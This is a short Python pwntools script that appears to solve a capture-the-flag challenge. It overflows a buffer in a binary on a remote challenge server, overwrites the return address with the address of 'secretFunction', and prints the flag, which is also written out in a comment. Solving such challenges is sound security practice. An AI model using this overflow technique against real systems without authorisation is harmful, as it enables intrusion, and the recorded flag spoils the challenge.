#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./vuln", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("34.125.199.248", 4056)

p.readline()

payload = b"A" * 0x198
payload += p64(elf.sym["secretFunction"])

p.sendline(payload)

p.readuntil(b"Flag: ")

flag = p.readline()

log.success(flag.decode()) # OSCTF{buff3r_buff3t_w4s_e4sy!}
